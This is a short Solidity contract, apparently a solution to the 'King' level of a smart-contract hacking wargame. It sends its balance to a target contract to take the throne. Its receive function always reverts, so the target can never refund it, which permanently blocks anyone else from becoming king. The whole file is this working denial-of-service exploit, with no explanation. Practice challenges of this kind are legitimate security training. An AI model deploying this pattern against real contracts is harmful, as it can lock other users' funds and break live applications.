// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        revert("hacked!");
    }

    function hackContract() external {
        payable(contractAddress).call{value: address(this).balance}("");
        console.log("test %s", contractAddress);
    }
}
